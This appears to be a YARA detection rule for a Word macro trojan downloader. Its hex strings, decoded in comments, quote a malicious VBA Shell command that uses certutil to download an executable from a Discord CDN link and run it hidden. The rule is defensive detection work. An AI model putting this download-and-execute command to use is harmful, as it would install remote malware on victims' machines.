
rule TrojanDownloader_O97M_Powdow_PDW_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDW!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 34 32 30 34 31 34 35 32 32 34 35 30 33 32 39 38 34 2f 39 34 32 30 39 33 32 32 32 37 34 34 38 32 31 38 33 30 2f 43 6f 6e 66 69 72 6d 61 74 69 6f 6e 5f 57 61 79 42 69 6c 6c 5f 52 65 63 65 69 70 74 2e 65 78 65 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://cdn.discordapp.com/attachments/942041452245032984/942093222744821830/Confirmation_WayBill_Receipt.exe"
		$a_01_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 58 79 79 72 74 6a 79 70 63 73 75 68 67 75 72 77 70 73 72 6b 6d 70 6b 6f 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 .exe.exe && Xyyrtjypcsuhgurwpsrkmpko.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}